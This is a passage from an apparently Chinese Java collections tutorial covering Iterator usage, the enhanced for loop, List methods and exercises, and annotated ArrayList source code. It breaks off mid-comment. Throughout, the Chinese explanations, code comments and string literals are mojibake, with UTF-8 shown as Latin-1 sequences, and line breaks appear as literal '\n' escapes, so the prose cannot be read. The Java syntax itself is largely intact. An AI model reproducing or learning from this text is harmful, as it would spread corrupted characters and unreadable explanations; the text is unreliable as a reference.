æœ¬èº«å¹¶ä¸å­˜æ”¾å¯¹è±¡ã€‚\n- æ‰€æœ‰å®ç°äº†Collection æ¥å£çš„é›†åˆç±»éƒ½æœ‰ä¸€ä¸ª iterator() æ–¹æ³•ï¼Œç”¨ä»¥è¿”å›ä¸€ä¸ªå®ç°äº†Iterator æ¥å£çš„å¯¹è±¡ï¼Œ å³å¯ä»¥è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€‚\n\n##### Iterator æ¥å£æ–¹æ³•\n\n- literator() å¾—åˆ°ä¸€ä¸ªé›†åˆçš„è¿­ä»£å™¨\n- hasNext() åˆ¤æ–­æ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ \n- next() ä¸‹ç§»å¹¶å°†ä¸‹ç§»ä»¥åé›†åˆä½ç½®ä¸Šçš„å…ƒç´ è¿”å›\n- remove() ç§»é™¤é›†åˆå…ƒç´ \n\nåœ¨è°ƒç”¨ iterator.next() æ–¹æ³•ä¹‹å‰å¿…é¡»è¦è°ƒç”¨ iterator.hasNext() è¿›è¡Œæ£€æµ‹ã€‚è‹¥ä¸è°ƒç”¨ï¼Œå¦‚æœä¸‹ä¸€æ¡è®°å½•æ— æ•ˆï¼Œç›´æ¥è°ƒç”¨ it.next() ä¼šæŠ›å‡ºNoSuchElementExceptionå¼‚å¸¸ã€‚\n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.Iterator;\n\npublic class CollectionIterator {\n    public static void main(String[] args) {\n        Collection col = new ArrayList();\n        col.add(new Book_(\"ä¸‰å›½æ¼”ä¹‰\", \"ç½—è´¯ä¸­\", 10.1));\n        col.add(new Book_(\"å°æé£åˆ€\", \"å¤é¾™\", 5.1));\n        col.add(new Book_(\"çº¢æ¥¼æ¢¦\", \"æ›¹é›ªèŠ¹\", 34.6));\n        System.out.println(\"col=\" + col);\n        //1. å…ˆå¾—åˆ°col å¯¹åº”çš„è¿­ä»£å™¨\n        Iterator iterator = col.iterator();\n        //2. ä½¿ç”¨while å¾ªç¯éå†  å¿«æ·é”®ï¼šitit\n        while (iterator.hasNext()) {//åˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ•°æ®\n            Object obj = iterator.next();//è¯»å–å½“å‰é›†åˆæ•°æ®å…ƒç´ \n            System.out.println(\"col=\" + obj);\n        }\n        //3. å½“é€€å‡ºwhile å¾ªç¯å, è¿™æ—¶iterator è¿­ä»£å™¨ï¼ŒæŒ‡å‘æœ€åçš„å…ƒç´ \n        // iterator.next();//NoSuchElementException\n        //4. å¦‚æœå¸Œæœ›å†æ¬¡éå†ï¼Œéœ€è¦é‡ç½®æˆ‘ä»¬çš„è¿­ä»£å™¨\n        iterator = col.iterator();\n        System.out.println(\"===ç¬¬äºŒæ¬¡éå†===\");\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(\"col=\" + obj);\n        }\n        //5.ç§»é™¤é›†åˆå…ƒç´ \n        iterator = col.iterator();\n        System.out.println(\"===ç§»é™¤é›†åˆå…ƒç´ ===\");\n        while(iterator.hasNext()){\n            Object obj = iterator.next();\n            iterator.remove();\n            System.out.println(\"col=\" + col);\n        }\n    }\n}\n\nclass Book_ {\n    private String name;\n    private String author;\n    private double price;\n\n    public Book_(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book_{\" +\n                \"name='\" + name + '\\'' +\n                \", author='\" + author + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n#### å¢å¼ºforéå†\n\n- å¢å¼º for å¾ªç¯ï¼Œ å¯ä»¥ä»£æ›¿ iterator è¿­ä»£å™¨ï¼Œ å¢å¼º for åº•å±‚å°±æ˜¯è¿­ä»£å™¨\n\n- å¢å¼º for å°±æ˜¯ç®€åŒ–ç‰ˆçš„ iteratorï¼Œæœ¬è´¨ä¸€æ ·ã€‚åªèƒ½ç”¨äºéå†é›†åˆæˆ–æ•°ç»„ã€‚\n\n- åŸºæœ¬è¯­æ³•ï¼š`for(å…ƒç´ ç±»å‹ å…ƒç´ å:é›†åˆåæˆ–æ•°ç»„å) {}`\n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\n\npublic class CollectionFor {\n    public static void main(String[] args) {\n        Collection col = new ArrayList();\n        col.add(new Book_(\"ä¸‰å›½æ¼”ä¹‰\", \"ç½—è´¯ä¸­\", 10.1));\n        col.add(new Book_(\"å°æé£åˆ€\", \"å¤é¾™\", 5.1));\n        col.add(new Book_(\"çº¢æ¥¼æ¢¦\", \"æ›¹é›ªèŠ¹\", 34.6));\n        System.out.println(\"col=\" + col);\n\t\t\t\t//å¢å¼ºfor  å¿«æ·é”®ï¼šI\n        for (Object o :col) {\n            System.out.println(\"col=\" + o);\n        }\n    }\n}\n\nclass Book_ {\n    private String name;\n    private String author;\n    private double price;\n\n    public Book_(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book_{\" +\n                \"name='\" + name + '\\'' +\n                \", author='\" + author + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n## Iã€List\n\n### ç‰¹ç‚¹\n\nList æ¥å£æ˜¯ Collection æ¥å£çš„å­æ¥å£\n\n- List é›†åˆç±»ä¸­å…ƒç´ æœ‰åº(å³æ·»åŠ é¡ºåºå’Œå–å‡ºé¡ºåºä¸€è‡´)ã€ä¸”å¯é‡å¤\n\n```java\nList list = new ArrayList();\nlist.add(\"tom\");\nlist.add(\"tom\");//å¯ä»¥é‡å¤\nlist.add(\"mary\");\nlist.add(\"jwt\");\n```\n\n- List é›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰å…¶å¯¹åº”çš„é¡ºåºç´¢å¼•ï¼Œå³æ”¯æŒç´¢å¼•ã€‚\n\n```java\nSystem.out.println(list.get(3));//jwt\n```\n\n- List æ¥å£å®ç°ç±»å¸¸ç”¨çš„æœ‰ï¼šArrayListã€LinkedListã€Vector\n\n### å¸¸ç”¨æ–¹æ³•\n\n- add() æ·»åŠ å•ä¸ªå…ƒç´ \n- add(int index, Object ele) åœ¨ index ä½ç½®æ’å…¥ ele å…ƒç´ \n- addAll(int index, Collection eles) ä» index ä½ç½®å¼€å§‹å°† eles ä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥\n- get(int index) è·å–æŒ‡å®š index ä½ç½®çš„å…ƒç´ \n-  indexOf(Object obj) è¿”å› obj åœ¨é›†åˆä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®\n- lastIndexOf(Object obj) è¿”å› obj åœ¨å½“å‰é›†åˆä¸­æœ«æ¬¡å‡ºç°çš„ä½ç½®\n- remove(int index) ç§»é™¤æŒ‡å®š index ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´ \n- set(int index, Object ele) è®¾ç½®æŒ‡å®š index ä½ç½®çš„å…ƒç´ ä¸º ele , ç›¸å½“äºæ˜¯æ›¿æ¢\n- subList(int fromIndex, int toIndex)  è¿”å›ä» [fromIndex,toIndex) ä½ç½®çš„å­é›†åˆ\n\n```java\npackage com.jwt.list_;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class ListMethod {\n    public static void main(String[] args) {\n        List list = new ArrayList();\n        list.add(\"å¼ ä¸‰ä¸°\");\n        list.add(\"è´¾å®ç‰\");\n        // void add(int index, Object ele):åœ¨index ä½ç½®æ’å…¥ele å…ƒç´ \n        //åœ¨index = 1 çš„ä½ç½®æ’å…¥ä¸€ä¸ªå¯¹è±¡\n        list.add(1, \"ç®€ç®€\");\n        System.out.println(\"list=\" + list);\n        // boolean addAll(int index, Collection eles):ä»index ä½ç½®å¼€å§‹å°†eles ä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥\n        List list2 = new ArrayList();\n        list2.add(\"jack\");\n        list2.add(\"tom\");\n        list.addAll(1, list2);\n        System.out.println(\"list2=\" + list2);\n        System.out.println(\"list=\" + list);\n        // Object get(int index):è·å–æŒ‡å®šindex ä½ç½®çš„å…ƒç´ \n        System.out.println(list.get(3));\n        // int indexOf(Object obj):è¿”å›obj åœ¨é›†åˆä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®\n        System.out.println(list.indexOf(\"tom\"));//2\n        // int lastIndexOf(Object obj):è¿”å›obj åœ¨å½“å‰é›†åˆä¸­æœ«æ¬¡å‡ºç°çš„ä½ç½®\n        list.add(\"ç®€ç®€\");\n        System.out.println(\"list=\" + list);\n        System.out.println(list.lastIndexOf(\"ç®€ç®€\"));\n        // Object remove(int index):ç§»é™¤æŒ‡å®šindex ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´ \n        Object remove = list.remove(0);\n        System.out.println(\"remove = \" + remove);\n        System.out.println(\"list=\" + list);\n        // Object set(int index, Object ele):è®¾ç½®æŒ‡å®šindex ä½ç½®çš„å…ƒç´ ä¸ºele , ç›¸å½“äºæ˜¯æ›¿æ¢.\n        list.set(1, \"ç›ä¸½\");\n        System.out.println(\"list=\" + list);\n        // List subList(int fromIndex, int toIndex):è¿”å›ä»[fromIndex,toIndex) ä½ç½®çš„å­é›†åˆ\n        List returnlist = list.subList(0, 2);\n        System.out.println(\"returnlist=\" + returnlist);\n\n    }\n}\n```\n\n### éå†æ–¹å¼\n\n```java\npackage com.jwt.list_;\n\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class ListFor {\n    public static void main(String[] args) {\n        //List æ¥å£çš„å®ç°å­ç±»ArrayListã€Vectorã€LinkedList\n        //List list = new ArrayList();\n        //List list = new Vector();\n        List list = new LinkedList();\n        list.add(\"jack\");\n        list.add(\"tom\");\n        list.add(\"é±¼é¦™è‚‰ä¸\");\n        list.add(\"åŒ—äº¬çƒ¤é¸­å­\");\n        //éå†\n        //1. è¿­ä»£å™¨ å¿«æ·ä»£ç itit\n        Iterator iterator = list.iterator();\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(obj);\n        }\n\n        //2. å¢å¼ºfor å¿«æ·ä»£ç I\n        System.out.println(\"=====å¢å¼ºfor=====\");\n        for (Object o : list) {\n            System.out.println(\"o=\" + o);\n        }\n\n        //3. ä½¿ç”¨æ™®é€šfor\n        System.out.println(\"=====æ™®é€šfor====\");\n        for (int i = 0; i < list.size(); i++) {\n            System.out.println(\"å¯¹è±¡=\" + list.get(i));\n        }\n    }\n}\n```\n\n### ç»ƒä¹ \n\n##### é¢˜1\n\næ·»åŠ 10ä¸ªä»¥ä¸Šçš„å…ƒç´ ï¼Œåœ¨2å·ä½æ’å…¥ä¸€ä¸ªå…ƒç´ \"ç®€ç®€\"ï¼Œè·å¾—ç¬¬5ä¸ªå…ƒç´ ï¼Œåˆ é™¤ç¬¬6ä¸ªå…ƒç´ ï¼Œä¿®æ”¹ç¬¬7ä¸ªå…ƒç´ ï¼Œåœ¨ä½¿ç”¨è¿­ä»£å™¨éå†é›†åˆï¼Œè¦æ±‚ï¼šä½¿ç”¨ List çš„å®ç°ç±» ArrayList å®Œæˆã€‚\n\n```java\npackage com.jwt.list_;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.List;\n\npublic class ListExercise {\n    public static void main(String[] args) {\n        List list = new ArrayList();\n        for (int i = 0; i < 10; i++) {\n            list.add(i);\n        }\n        System.out.println(list);\n        //åœ¨2å·ä½æ’å…¥ä¸€ä¸ªå…ƒç´ \n        list.add(1,\"ç®€ç®€\");\n        System.out.println(list);\n        //è·å¾—ç¬¬5ä¸ªå…ƒç´ \n        System.out.println(list.get(4));\n        //åˆ é™¤ç¬¬6ä¸ªå…ƒç´ \n        list.remove(5);\n        System.out.println(list);\n        //ä¿®æ”¹ç¬¬7ä¸ªå…ƒç´ \n        list.set(6,\"ç®€ç®€\");\n        System.out.println(list);\n        //è¿­ä»£å™¨éå†\n        Iterator iterator = list.iterator();\n        while (iterator.hasNext()) {\n            Object next = iterator.next();\n            System.out.println(next);\n        }\n    }\n}\n```\n\n##### é¢˜2\n\nä½¿ç”¨ List çš„å®ç°ç±»æ·»åŠ ä¸‰æœ¬å›¾ä¹¦ï¼Œå¹¶éå†ï¼Œæ‰“å°å¦‚ä¸‹æ•ˆæœ\nåç§°: xx\tä»·æ ¼: xx\tä½œè€…: xx\nåç§°: xx\tä»·æ ¼: xx\tä½œè€…: xx\nåç§°: xx\tä»·æ ¼: xx\tä½œè€…: xx\n\n- 1)æŒ‰ä»·æ ¼æ’åºï¼Œä»ä½åˆ°é«˜(ä½¿ç”¨å†’æ³¡æ³•)\n\n- 2)è¦æ±‚ä½¿ç”¨ArrayListã€LinkedList å’ŒVectorä¸‰ç§é›†åˆå®ç°\n\n```java\npackage com.jwt.list_;\n\nimport java.util.List;\nimport java.util.Vector;\n\npublic class ListExercise02 {\n    public static void main(String[] args) {\n        //List<Book2> books = new ArrayList<Book2>();\n        //LinkedList<Book2> books = new LinkedList<Book2>();\n        Vector<Book2> books = new Vector<>();\n        books.add(new Book2(\"çº¢æ¥¼æ¢¦\", \"æ›¹é›ªèŠ¹\", 90));\n        books.add(new Book2(\"è¥¿æ¸¸è®°\", \"å´æ‰¿æ©\", 100));\n        books.add(new Book2(\"æ°´æµ’ä¼ \", \"æ–½è€åºµ\", 80));\n        System.out.println(\"==æ’åºå‰==\");\n        for (Object o : books) {\n            System.out.println(o);\n        }\n        System.out.println(\"==æ’åºå==\");\n        bubblesort(books);\n        for (Object o : books) {\n            System.out.println(o);\n        }\n    }\n    //å†’æ³¡æ’åº\n    public static void bubblesort(List list) {\n        int listSize = list.size();\n        for (int i = 0; i < listSize - 1; i++) {\n            for (int j = 0; j < listSize - 1 - i; j++) {\n                //å–å‡ºå¯¹è±¡Book\n                Book2 book1 = (Book2) list.get(j);\n                Book2 book2 = (Book2) list.get(j + 1);\n                if (book1.getPrice() > book2.getPrice()) {//äº¤æ¢\n                    list.set(j, book2);\n                    list.set(j + 1, book1);\n                }\n            }\n        }\n    }\n}\n\nclass Book2{\n    private String name;\n    private String author;\n    private double price;\n\n    public Book2(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAuthor() {\n        return author;\n    }\n\n    public void setAuthor(String author) {\n        this.author = author;\n    }\n\n    public double getPrice() {\n        return price;\n    }\n\n    public void setPrice(double price) {\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"åç§°ï¼š\" + name + \"\\tä»·æ ¼:\" + price + \"\\tä½œè€…\" + author ;\n    }\n}\n```\n\n## 1.1 ArrayList\n\n### ç®€ä»‹\n\n![](https://img.jwt1399.top/img/image-20220321110347767.png)\n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable{}\n```\n\n- ArrayList çš„åº•å±‚æ˜¯æ•°ç»„é˜Ÿåˆ—ï¼Œç›¸å½“äºåŠ¨æ€æ•°ç»„ã€‚ä¸ Java ä¸­çš„æ•°ç»„ç›¸æ¯”ï¼Œå®ƒçš„å®¹é‡èƒ½åŠ¨æ€å¢é•¿ã€‚\n\n- ArrayList ç»§æ‰¿äº `AbstractList` ï¼Œå®ç°äº† `List`, `RandomAccess`, `Cloneable`, `java.io.Serializable` è¿™äº›æ¥å£ã€‚\n  - `RandomAccess` æ˜¯ä¸€ä¸ªæ ‡å¿—æ¥å£ï¼Œè¡¨æ˜å®ç°è¿™ä¸ªè¿™ä¸ªæ¥å£çš„ List é›†åˆæ˜¯æ”¯æŒå¿«é€Ÿéšæœºè®¿é—®çš„ã€‚åœ¨ ArrayList ä¸­ï¼Œæˆ‘ä»¬å³å¯ä»¥é€šè¿‡å…ƒç´ çš„åºå·å¿«é€Ÿè·å–å…ƒç´ å¯¹è±¡ï¼Œè¿™å°±æ˜¯å¿«é€Ÿéšæœºè®¿é—®ã€‚\n  - `ArrayList` å®ç°äº† `Cloneable` æ¥å£ ï¼Œå³è¦†ç›–äº†å‡½æ•°`clone()`ï¼Œèƒ½è¢«å…‹éš†ã€‚\n  - `ArrayList` å®ç°äº† `java.io.Serializable`æ¥å£ï¼Œè¿™æ„å‘³ç€`ArrayList`æ”¯æŒåºåˆ—åŒ–ï¼Œèƒ½é€šè¿‡åºåˆ—åŒ–å»ä¼ è¾“ã€‚\n\n### ç‰¹ç‚¹\n\n- ArrayList åº•å±‚å®ç°æ˜¯ä¸€ä¸ª `Object` æ•°ç»„\n\n  - `transient Object[] elementData;`\n\n- ArrayList åªèƒ½å­˜å‚¨å¯¹è±¡å¼•ç”¨ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬éœ€è¦è£…è½½çš„æ•°æ®æ˜¯è¯¸å¦‚ `int`ã€`float` ç­‰åŸºæœ¬æ•°æ®ç±»å‹çš„æ—¶å€™ï¼Œå¿…é¡»æŠŠå®ƒä»¬è½¬æ¢æˆå¯¹åº”çš„åŒ…è£…ç±»\n\n- ArrayList å¯ä»¥åŠ å…¥ nullï¼Œå¹¶ä¸”å¯ä»¥å¤šä¸ª null\n\n  ```java\n  list.add(null);\n  list.add(\"jianjian\");\n  list.add(null);\n  ```\n\n- ArrayList åŸºæœ¬ç­‰åŒäº Vectorï¼Œé™¤äº† ArrayList æ˜¯çº¿ç¨‹ä¸å®‰å…¨(æ‰§è¡Œæ•ˆç‡é«˜)ï¼Œåœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œä¸å»ºè®®ä½¿ç”¨ ArrayList\n\n  ```java\n  //ArrayList æ˜¯çº¿ç¨‹ä¸å®‰å…¨ï¼Œæ²¡æœ‰ synchronized\n  //addæºç \n  public boolean add(E e) {\n    ensureCapacityInternal(size + 1);  \n    elementData[size++] = e;\n    return true;\n  }\n  ```\n\n### æ ¸å¿ƒæºç \n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable\n{\n    private static final long serialVersionUID = 8683452581122892189L;\n\n    /**\n     * é»˜è®¤åˆå§‹å®¹é‡å¤§å°\n     */\n    private static final int DEFAULT_CAPACITY = 10;\n\n    /**\n     * ç©ºæ•°ç»„ï¼ˆç”¨äºç©ºå®ä¾‹ï¼‰ã€‚\n     */\n    private static final Object[] EMPTY_ELEMENTDATA = {};\n\n     //ç”¨äºé»˜è®¤å¤§å°ç©ºå®ä¾‹çš„å…±äº«ç©ºæ•°ç»„å®ä¾‹ã€‚\n    //æˆ‘ä»¬æŠŠå®ƒä»EMPTY_ELEMENTDATAæ•°ç»„ä¸­åŒºåˆ†å‡ºæ¥ï¼Œä»¥çŸ¥é“åœ¨æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ æ—¶å®¹é‡éœ€è¦å¢åŠ å¤šå°‘ã€‚\n    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n\n    /**\n     * ä¿å­˜ArrayListæ•°æ®çš„æ•°ç»„\n     */\n    transient Object[] elementData; // non-private to simplify nested class access\n\n    /**\n     * ArrayList æ‰€åŒ…å«çš„å…ƒç´ ä¸ªæ•°\n     */\n    private int size;\n\n    /**\n     * å¸¦åˆå§‹å®¹é‡å‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆç”¨æˆ·å¯ä»¥åœ¨åˆ›å»ºArrayListå¯¹è±¡æ—¶è‡ªå·±æŒ‡å®šé›†åˆçš„åˆå§‹å¤§å°ï¼‰\n     */\n    public ArrayList(int initialCapacity) {\n        if (initialCapacity > 0) {\n            //å¦‚æœä¼ å…¥çš„å‚æ•°å¤§äº0ï¼Œåˆ›å»ºinitialCapacityå¤§å°çš„æ•°ç»„\n            this.elementData = new Object[initialCapacity];\n        } else if (initialCapacity == 0) {\n            //å¦‚æœä¼ å…¥çš„å‚æ•°ç­‰äº0ï¼Œåˆ›å»ºç©ºæ•°ç»„\n            this.elementData = EMPTY_ELEMENTDATA;\n        } else {\n            //å…¶ä»–æƒ…å†µï¼ŒæŠ›å‡ºå¼‚å¸¸\n            throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                               initialCapacity);\n        }\n    }\n\n    /**\n     *é»˜è®¤æ— å‚æ„é€ å‡½æ•°\n     *DEFAULTCAPACITY_EMPTY_ELEMENTDATA ä¸º0.åˆå§‹åŒ–ä¸º10ï¼Œä¹Ÿå°±æ˜¯è¯´åˆå§‹å…¶å®æ˜¯ç©ºæ•°ç»„ å½“æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™æ•°ç»„å®¹é‡æ‰å˜æˆ10\n     */\n    public ArrayList() {\n        this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n    }\n\n    /**\n     * æ„é€ ä¸€ä¸ªåŒ…å«æŒ‡å®šé›†åˆçš„å…ƒç´ çš„åˆ—è¡¨ï¼ŒæŒ‰ç…§å®ƒä»¬ç”±é›†åˆçš„è¿­ä»£å™¨è¿”å›çš„é¡ºåºã€‚\n     */\n    public ArrayList(Collection<? extends E> c) {\n        //å°†æŒ‡å®šé›†åˆè½¬æ¢ä¸ºæ•°ç»„\n        elementData = c.toArray();\n        //å¦‚æœelementDataæ•°ç»„çš„é•¿åº¦ä¸ä¸º0\n        if ((size = elementData.length) != 0) {\n            // å¦‚æœelementDataä¸æ˜¯Objectç±»å‹æ•°æ®ï¼ˆc.toArrayå¯èƒ½è¿”å›çš„ä¸æ˜¯Objectç±»å‹çš„æ•°ç»„æ‰€ä»¥åŠ ä¸Šä¸‹é¢çš„è¯­å¥ç”¨äºåˆ¤æ–­ï¼‰\n            if (elementData.getClass() != Object[].class)\n                //å°†åŸæ¥ä¸æ˜¯Objectç±»å‹çš„elementDataæ•°ç»„çš„å†…å®¹ï¼Œèµ‹å€¼ç»™æ–°çš„Objectç±»å‹çš„elementDataæ•°ç»„\n                elementData = Arrays.copyOf(elementData, size, Object[].class);\n        } else {\n            // å…¶ä»–æƒ…å†µï¼Œç”¨ç©ºæ•°ç»„ä»£æ›¿\n            this.elementData = EMPTY_ELEMENTDATA;\n        }\n    }\n\n    /**\n     * ä¿®æ”¹è¿™ä¸ªArrayListå®ä¾‹çš„å®¹é‡æ˜¯åˆ—è¡¨çš„å½“å‰å¤§å°ã€‚ åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨æ­¤æ“ä½œæ¥æœ€å°åŒ–ArrayListå®ä¾‹çš„å­˜å‚¨ã€‚\n     */\n    public void trimToSize() {\n        modCount++;\n        if (size < elementData.length) {\n            elementData = (size == 0)\n              ? EMPTY_ELEMENTDATA\n              : Arrays.copyOf(elementData, size);\n        }\n    }\n    //ä¸‹é¢æ˜¯ArrayListçš„æ‰©å®¹æœºåˆ¶\n    //ArrayListçš„æ‰©å®¹æœºåˆ¶æé«˜äº†æ€§èƒ½ï¼Œå¦‚æœæ¯æ¬¡åªæ‰©å……ä¸€ä¸ªï¼Œ\n    //é‚£ä¹ˆé¢‘ç¹çš„æ’å…¥ä¼šå¯¼è‡´é¢‘ç¹çš„æ‹·è´ï¼Œé™ä½æ€§èƒ½ï¼Œè€ŒArrayListçš„æ‰©å®¹æœºåˆ¶é¿å…äº†è¿™ç§æƒ…å†µã€‚\n    /**\n     * å¦‚æœ‰å¿…è¦ï¼Œå¢åŠ æ­¤ArrayListå®ä¾‹çš„å®¹é‡ï¼Œä»¥ç¡®ä¿å®ƒè‡³å°‘èƒ½å®¹çº³å…ƒç´ çš„æ•°é‡\n     * @param   minCapacity   æ‰€éœ€çš„æœ€å°å®¹é‡\n     */\n    public void ensureCapacity(int minCapacity) {\n        //å¦‚æœæ˜¯trueï¼ŒminExpandçš„å€¼ä¸º0ï¼Œå¦‚æœæ˜¯false,minExpandçš„å€¼ä¸º10\n        int minExpand = (elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA)\n            // any size if not default element table\n            ? 0\n            // larger than default for default empty table. It's already\n            // supposed to be at default size.\n            : DEFAULT_CAPACITY;\n        //å¦‚æœæœ€å°å®¹é‡å¤§äºå·²æœ‰çš„æœ€å¤§å®¹é‡\n        if (minCapacity > minExpand) {\n            ensureExplicitCapacity(minCapacity);\n        }\n    }\n    //å¾—åˆ°æœ€å°æ‰©å®¹é‡\n    private void ensureCapacityInternal(int minCapacity) {\n        if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n              // è·å–â€œé»˜è®¤çš„å®¹é‡â€å’Œâ€œä¼ å…¥å‚æ•°â€ä¸¤è€…ä¹‹é—´çš„æœ€å¤§å€¼\n            minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);\n        }\n\n        ensureExplicitCapacity(minCapacity);\n    }\n    //åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹\n    private void ensureExplicitCapacity(int minCapacity) {\n        modCount++;\n\n        // overflow-conscious code\n        if (minCapacity - elementData.length > 0)\n            //è°ƒç”¨growæ–¹æ³•è¿›è¡Œæ‰©å®¹ï¼Œè°ƒç”¨æ­¤æ–¹æ³•ä»£è¡¨å·²ç»å¼€å§‹æ‰©å®¹äº†\n            grow(minCapacity);\n    }\n\n    /**\n     * è¦åˆ†é…çš„æœ€å¤§æ•°ç»„å¤§å°\n     */\n    private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n\n    /**\n     * ArrayListæ‰©å®¹çš„æ ¸å¿ƒæ–¹æ³•ã€‚\n     */\n    private void grow(int minCapacity) {\n        // oldCapacityä¸ºæ—§å®¹é‡ï¼ŒnewCapacityä¸ºæ–°å®¹é‡\n        int oldCapacity = elementData.length;\n        //å°†oldCapacity å³ç§»ä¸€ä½ï¼Œå…¶æ•ˆæœç›¸å½“äºoldCapacity /2ï¼Œ\n        //æˆ‘ä»¬çŸ¥é“ä½è¿ç®—çš„é€Ÿåº¦è¿œè¿œå¿«äºæ•´é™¤è¿ç®—ï¼Œæ•´å¥è¿ç®—å¼çš„ç»“æœå°±æ˜¯å°†æ–°å®¹é‡æ›´æ–°ä¸ºæ—§å®¹é‡çš„1.5å€ï¼Œ\n        int newCapacity = oldCapacity + (oldCapacity >> 1);\n        //ç„¶åæ£€æŸ¥æ–°å®¹é‡æ˜¯å¦å¤§äºæœ€å°éœ€è¦å®¹é‡ï¼Œè‹¥è¿˜æ˜¯å°äºæœ€å°éœ€è¦å®¹é‡ï¼Œé‚£ä¹ˆå°±æŠŠæœ€å°éœ€è¦å®¹é‡å½“ä½œæ•°ç»„çš„æ–°å®¹é‡ï¼Œ\n        if (newCapacity - minCapacity < 0)\n            newCapacity = minCapacity;\n        //å†æ£€æŸ¥æ–°å®¹é‡æ˜¯å¦è¶…å‡ºäº†ArrayListæ‰€å®šä¹‰çš„æœ€å¤§å®¹é‡ï¼Œ\n        //è‹¥è¶…å‡ºäº†ï¼Œåˆ™è°ƒç”¨hugeCapacity()æ¥æ¯”è¾ƒminCapacityå’Œ MAX_ARRAY_SIZEï¼Œ\n        //å¦‚æœminCapacityå¤§äºMAX_ARRAY_SIZEï¼Œåˆ™æ–°å®¹é‡åˆ™ä¸ºInterger.MAX_VALUEï¼Œå¦åˆ™ï¼Œæ–°å®¹é‡å¤§å°åˆ™ä¸º MAX_ARRAY_SIZEã€‚\n        if (newCapacity - MAX_ARRAY_SIZE > 0)\n            newCapacity = hugeCapacity(minCapacity);\n        // minCapacity is usually close to size, so this is a win:\n        elementData = Arrays.copyOf(elementData, newCapacity);\n    }\n    //æ¯”è¾ƒminCapacityå’Œ MAX_ARRAY_SIZE\n    private static int hugeCapacity(int minCapacity) {\n        if (minCapacity < 0) // overflow\n            throw new OutOfMemoryError();\n        return (minCapacity > MAX_ARRAY_SIZE) ?\n            Integer.MAX_VALUE :\n            MAX_ARRAY_SIZE;\n    }\n\n    /**\n     *è¿”å›æ­¤åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°ã€‚\n     */\n    public int size() {\n        return size;\n    }\n\n    /**\n     * å¦‚æœæ­¤åˆ—è¡¨ä¸åŒ…å«å…ƒç´ ï¼Œåˆ™è¿”å› true ã€‚\n     */\n    public boolean isEmpty() {\n        //æ³¨æ„=å’Œ==çš„åŒºåˆ«\n        return size == 0;\n    }\n\n    /**\n     * å¦‚æœæ­¤åˆ—è¡¨åŒ…å«æŒ‡å®šçš„å…ƒç´ ï¼Œåˆ™è¿”å›true ã€‚\n     */\n    public boolean contains(Object o) {\n        //indexOf()æ–¹æ³•ï¼šè¿”å›æ­¤åˆ—è¡¨ä¸­æŒ‡å®šå…ƒç´ çš„é¦–æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œå¦‚æœæ­¤åˆ—è¡¨ä¸åŒ…å«æ­¤å…ƒç´ ï¼Œåˆ™ä¸º-1\n        return indexOf(o) >= 0;\n    }\n\n    /**\n     *è¿”å›æ­¤åˆ—è¡¨ä¸­æŒ‡å®šå…ƒç´ çš„é¦–æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œå¦‚æœæ­¤åˆ—è¡¨ä¸åŒ…å«æ­¤å…ƒç´ ï¼Œåˆ™ä¸º-1\n     */\n    public int indexOf(Object o) {\n        if (o == null) {\n            for (int i = 0; i < size; i++)\n                if (elementData[i]==null)\n                    return i;\n        } else {\n            for (int i = 0; i < size; i++)\n                //equals()æ–¹æ³•æ¯”è¾ƒ\n                if (o.equals(elementData[i]))\n                    return i;\n        }\n        return -1;\n    }\n\n    /**\n     * 